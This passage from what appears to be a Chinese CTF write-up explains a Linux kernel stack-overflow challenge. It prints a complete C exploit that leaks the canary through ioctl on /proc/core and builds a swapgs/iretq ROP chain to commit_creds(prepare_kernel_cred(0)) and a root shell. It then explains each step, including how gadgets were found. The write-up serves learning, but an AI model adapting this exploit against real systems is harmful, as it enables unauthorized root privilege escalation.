我们先给出exp:
     1 #include 
     2 #include 
     3 #include 
     4 #include 
     5 #include 
     6 #include 
     7 #include 
     8 //1st. set off and leak canary
     9 //2nd. find:commit_creds() and prepare_kernel_cred()
    10 //3rd. save register etc
    11 //4th. set rop chain
    12 //5th. send rop chain
    13 //6th. root shell
    14 unsigned long raw_vmlinux_base = 0xffffffff81000000;
    15 unsigned long vmlinux_base;
    16 unsigned long offset;
    17 unsigned long c_c;
    18 unsigned long p_k_c;
    19 unsigned long canary;
    20 unsigned long rop_chain[0x30];
    21 unsigned long user_cs, user_ss, user_rflags, user_sp;
    22 void get_shell() {
    23     system("/bin/sh");
    24 }
    25 void find_sym() {
    26     printf("be sure you have run .sh getting addr of commit_creds and prepare_kernel_cred with grep");
    27     printf("input addr of commit_creds:n");
    28     scanf("%lx",&c_c);
    29     printf("input addr of prepare_kernel_cred:n");
    30     scanf("%lx",&p_k_c);
    31     vmlinux_base = c_c - 0x9c8e0;
    32     offset = vmlinux_base - raw_vmlinux_base;
    33 }
    34 void save_stat() {
    35     asm(
    36         "movq %%cs, %0n"
    37         "movq %%ss, %1n"
    38         "movq %%rsp, %2n"
    39         "pushfqn"
    40         "popq %3n"
    41         : "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags) : : "memory");
    42 }
    43 /*void save_stat() {
    44     __asm__("mov user_cs, cs;"
    45         "mov user_ss, ss;"
    46         "mov user_sp, rsp;"
    47         "pushf;"
    48         "pop user_rflags;"
    49     );
    50 }*/
    51 void privilge_escalation() {
    52     char* (*pkc)(int) = p_k_c;
    53     int (*cc)(char*) = c_c;
    54     (*cc)( (*pkc)(0) );
    55 }
    56 
    57 int main() {
    58     find_sym();
    59     save_stat();
    60     int fd = open("/proc/core", O_RDWR);
    61     //set off and leak canary
    62     unsigned long buf[8];//8*8=64
    63     ioctl(fd, 0x6677889C,0x40);
    64     ioctl(fd, 0x6677889B, buf);
    65     canary = buf[0];
    66     //set rop chain
    67     rop_chain[0] = 0x4141414141414141;
    68     rop_chain[1] = 0x4141414141414141;
    69     rop_chain[2] = 0x4141414141414141;
    70     rop_chain[3] = 0x4141414141414141;
    71     rop_chain[4] = 0x4141414141414141;
    72     rop_chain[5] = 0x4141414141414141;
    73     rop_chain[6] = 0x4141414141414141;
    74     rop_chain[7] = 0x4141414141414141;
    75     rop_chain[8] = canary;
    76     rop_chain[9] = 0x4141414141414141; //old_ebp
    77     rop_chain[10] = privilge_escalation;
    78     rop_chain[11] = 0xffffffff81a012da + offset; //swapgs,popfq,ret
    79     rop_chain[12] = 0;
    80     rop_chain[13] = 0xffffffff81050ac2 + offset; //iretq,ret
    81     rop_chain[14] = get_shell;
    82     rop_chain[15] = user_cs;
    83     rop_chain[16] = user_rflags;
    84     rop_chain[17] = user_sp;
    85     rop_chain[18] = user_ss;
    86     write(fd,rop_chain,0x30*8);
    87     ioctl(fd,0x6677889A,0xffffffffffff0000|0x100);
    88     return 0;
    89 }
**1.find_sym函数：泄露提权函数及计算vmlinux_base**
回去看init脚本的第九行可知，整个内核函数表被拷贝了一份到/tmp/kallsyms，而原来的/proc/kallsyms被设置为禁读，因此我们虽然读不了原来的/proc/kallsyms了但是可以读/tmp/kallsyms；我们的C程序exp其实完全可以自己到kallsyms文件里搜索两个提权函数的地址，然而笔者懒得写了，因此采用的方法是，写个sh脚本：两行分别是grep
commit_creds /tmp/kallsyms和grep prepare_kernel_cred
/tmp/kallsyms，然后在find_sym执行时手动输入，当然直接C实现也很简单只是懒得写了。。。
（其实这么懒不太应该，因为从现实意义上来说，内核pwn对应的应用场景其实是病毒的提权，作为一个病毒大概没有让用户输函数地址的吧咕咕咕）
**2.save_stat函数：保存用户环境**
之前说过，进内核态之前做的事情：swapgs、交换栈顶、push保存各种寄存器。我们看一下push保存各寄存器时对我们最重要的几个操作：
    pushq  $__USER_DS      /* pt_regs->ss */
    pushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs->sp */
    pushq  %r11             /* pt_regs->flags */
    pushq  $__USER_CS      /* pt_regs->cs */
    pushq  %rcx             /* pt_regs->ip */
这是前五个push操作，也是我们着陆时正确恢复用户环境需要关注的五个寄存器，注意这顺序是固定的，在着陆时执行的是swapgs，iretq；其中swapgs是自然没问题的，重要的是由于我们是栈溢出劫持的控制流，因此iretq恢复当初push保存的寄存器时，栈顶并不在当初的位置，这就需要我们在栈溢出的payload中构造上且要注意顺序，因此我们的这个save_stat函数正是做到了预先将这五个决定能否平安着陆的寄存器保存到用户变量里，然后在payload里按顺序部署好，最后也就保证了成功的着陆回用户空间。
注意进kernel时这五个寄存器最后做的是push保存了进之前的eip也就是用户空间的eip，我们的payload中将这个位置的值设置成get_shell函数的地址，回归以后就直接去执行get_shell了！
**3.关于gadget：**
这个gadget吧，恶心到笔者了，为什么呢？ctf
wiki上说不要用ropgadget，跑不动，要用ropper，好的于是笔者装了ropper，结果还是跑不动，一下午跑了94%然后崩了，各位读者要是有心情自己去试试吧，可能是笔者用的是虚拟机的原因吧。。。
于是本人用了另一种“拙劣”的办法找的gadget：我们需要的是swapgs和iretq，于是…core.cpio中的vmlinux拷贝出来…丢IDA…左上角工具栏搜索指令….
搜完了以后一个一个点进去看汇编，卧槽，还真找到了gadget（当然找不到那种非对齐的指令）
上图中第四个就是可用的gadget：
对于iretq也是同样的方法，但是注意一点：一般我们的gadget都是以ret指令结尾的，然而这道题中iretq指令后面并没必要一定得有个ret，因为iretq恢复到用户空间的时候就已经包括了恢复原来的eip这一步，在这个过程中我们已经完成了eip的劫持了，直接就跳过去get_shell了，因此IDA找到的所有iretq都是可以用的（当然找到的里面也有ret结尾的而且有俩），这一点本人已经实际验证过了。
**4.privilge_escalation函数：函数指针的正确声明！**
提权函数privilge_escalation()，直接(*c_c)( (*p_k_c)(0)
)是不行的，必须进行根据函数原型进行正确的函数指针声明再通过函数指针调用，否则编译会报声明类型错误，两个函数原型ctf
wiki上有前面也介绍了，那么问题来了，prepare_kernel_cred的返回值和commit_creds的参数是一个cred_entry结构体指针，而exp中给的是char*类型，既然不同为什么没有报错运行也没有出错呢？我们要关注本质，这里的返回值和参数在本质上是各指针也就是各内存地址，不管是char的指针还是cred_entry的指针在本质上没什么不一样的，都是个地址，都占8bytes，因此不会有问题。
**5.关于无符号数与负数的转换：**
不知道原理，网上抄的，有懂的师傅千万留个评论讲一下，太感谢了！本人尽量在下一篇文章中填上这个坑。
### 0x03.测试运行：
其中leak.sh就是上面提到的偷懒leak俩函数地址脚本。
此外，原题文件的flag权限感觉有问题，不是root也可以读，本人做了修改给他chmod 000了，感觉这样才是对的，只有root能读。
## 九、总结与心得
唉，每篇文章都免不了留坑，对不起狗粉丝。
收获还是挺大的，学到了好多Linux内核的知识。
下一篇还是同一道题，讲一下纯rop吧，因为要介绍一种保护机制。睡觉。